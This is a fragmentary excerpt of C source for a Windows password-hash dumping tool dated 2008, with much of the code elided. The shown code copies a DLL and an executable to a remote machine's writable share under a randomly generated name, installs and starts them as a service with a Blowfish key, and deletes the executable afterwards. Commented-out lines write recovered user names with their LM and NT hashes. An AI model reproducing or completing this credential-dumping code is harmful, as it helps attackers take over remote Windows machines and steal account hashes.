...
int main(int argc, char* argv[])
{
	...
	char szServiceFileName[MAX_PATH];
	bool bIs64Bit = false;
    ...
    fprintf(stderr, "Copyright 2008 foofus.net\n\n");
	...
	memset(rDllname, 0, MAX_PATH);
	memset(rExename, 0, MAX_PATH);

	// Generate a random name for the service
	memset(szServiceFileName, 0, MAX_PATH);
	nRand = GetRandomNumber(5, 10);
	for (i = 0; i < nRand; i++)
	{
		szServiceFileName[i] = GetRandomNumber(0x61, 0x7a); 
	}
	...
	else
	{
		...
		try
		{
			...
			sprintf(szFullServicePath, "%s\\%s.exe", szWritableSharePhysical, szServiceFileName);
			...
			if (!CopyFile(localPath, rDllname, FALSE))
			{
				sprintf(errMsg, "Couldn't copy %s to destination %s. (Error %d)\n", localPath, rDllname, GetLastError());
				throw errMsg;
			}
			...
			//printf("Copying %s to destination %s.\n", localPath, rExename);
			if (!CopyFile(localPath, rExename, FALSE))
			{
	...
	try
	{
        ...
        if(!hsvc)
        {
            ...
            if(!hsvc)
            {
                sprintf(errMsg, "Failed to create service (%s/%s)\n", szFullServicePath, szGUIDServiceName);
                throw errMsg;
            }
        }
		...
		varg[2] = &dwLen;
		varg[3] = (char*)&bSkipHistories;
		varg[4] = szServiceFileName;

		Blowfish_Init(&ctx, pEncryptionKey, dwLen);

		if(!StartService(hsvc, 5, (const char**)varg))
		{
            //fprintf(stderr, "Service start failed: %d\n", GetLastError());
            sprintf(errMsg, "Service start failed: %d (%s/%s)\n", GetLastError(), szFullServicePath, szGUIDServiceName);
            throw errMsg;
		}
		...
		{      
			if(!DeleteFile(rExename))
				fprintf(stderr, "Couldn't delete service executable from remote machine: %d\n", GetLastError());
		}*/
		if (rDllname[0] != 0)
		{      
		...
		else
		{
			...
			for (unsigned long index = 0; index < nUserInfoArraySize; index++)
			{
				...
				//WCHAR wszUser[512];
				//MultiByteToWideChar(CP_ACP, 0, pTemp->szUser, -1, wszUser, 256);
                //fprintf(outfile, "%ls:%s:%s:::\n", wszUser, LMdata, NTdata);
...
bool GetPhysicalPathForShare(char* szServer, char* lpszShare, char** lpszPhysicalPath, int nBufferSize)
{
	...
	res = NetShareGetInfo((char*)server, (char*)share, 502, (LPBYTE*)&BufPtr);
			...
			if (cbRead >= 3)
			{
				...
				else if (chBuf[0] == 2)
				{
					...
					for (i = 0; i <= cUserBlocks; i++)
					{
						...
						memcpy(pTemp->szUser + (i * 8), &dwDataChunk1, 4);
						memcpy(pTemp->szUser + (i * 8) + 4, &dwDataChunk2, 4);
					}
